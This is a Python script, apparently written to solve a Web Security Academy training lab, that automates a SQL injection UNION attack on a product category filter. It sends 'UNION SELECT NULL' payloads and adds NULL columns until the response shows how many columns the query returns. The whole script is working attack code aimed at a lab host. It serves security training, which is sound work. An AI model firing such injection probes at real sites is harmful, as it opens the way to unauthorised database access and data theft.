#!/usr/bin/env python

"""This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values."""


import requests
import sys



def add_nulls(query: str) -> str:
    str_index = query.find('NULL')
    new_query = query[:str_index] + 'NULL,' + query[str_index:]
    return new_query


lab_id = '0a1b004c04bd1d5ec0ef74b0000500a9' #change based on generated lab
query = '+UNION+SELECT+NULL--'
uri = f"https://{lab_id}.web-security-academy.net/filter?category='{query}"
print(f"sending query {query}")
r = requests.get(uri)
if int(r.headers['Content-length']) < 1500:
    for i in range(0, 11): #Try up to 10 NULL column checks, adjust max range for more
        query = add_nulls(query)
        print(f"sending query {query}")
        uri = f"https://{lab_id}.web-security-academy.net/filter?category='{query}"
        r2 = requests.get(uri)
        if int(r2.headers['Content-length']) > 1000:
            print(f'Success. Query: "{query}" triggers the union sqli')
            sys.exit(0)
else:
    print(f'Query: "{query}" triggers the union sqli, or there is another problem. Check website')
       

